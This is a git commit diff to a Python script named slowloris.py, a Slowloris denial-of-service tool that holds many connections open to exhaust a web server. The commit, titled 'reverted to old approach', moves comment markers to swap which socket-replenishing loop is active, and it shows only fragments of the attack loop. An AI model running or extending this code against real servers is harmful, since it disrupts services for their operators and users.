ca9f4b74f4fe6132d1b16fceb5a4572f2c167ff0
adam_stuart <adam.stuart729@gmail.com>
2025-03-28 15:10:22 +0000

    reverted to old approach

--- slowloris.py
+++ slowloris.py
@@ -47,7 +47,7 @@ def slowloris(IP, port, socket_count):
     # TODO use argv to pass in IP and port and socket count
     try:
         while True:
-            '''
+            
             # Make sure there are still socket_count sockets
             for i in range(socket_count - len(sockets)):
                 try:
@@ -58,7 +58,7 @@ def slowloris(IP, port, socket_count):
                     print("socket could not be established")
                     print(e)
                     break
-            '''
+            
             
             for s in sockets:
                 try:
@@ -67,7 +67,7 @@ def slowloris(IP, port, socket_count):
                     sockets.remove(s)
                     print(f"socket removed: {e}")
                     
-
+'''
             if len(sockets) < socket_count:
                 try:
                     s = create_socket(IP, port)
@@ -77,7 +77,7 @@ def slowloris(IP, port, socket_count):
                     print("socket could not be established")
                     print(e)
                     break
-
+'''
             
     except (KeyboardInterrupt, SystemExit):
         print("Stopping slowloris")
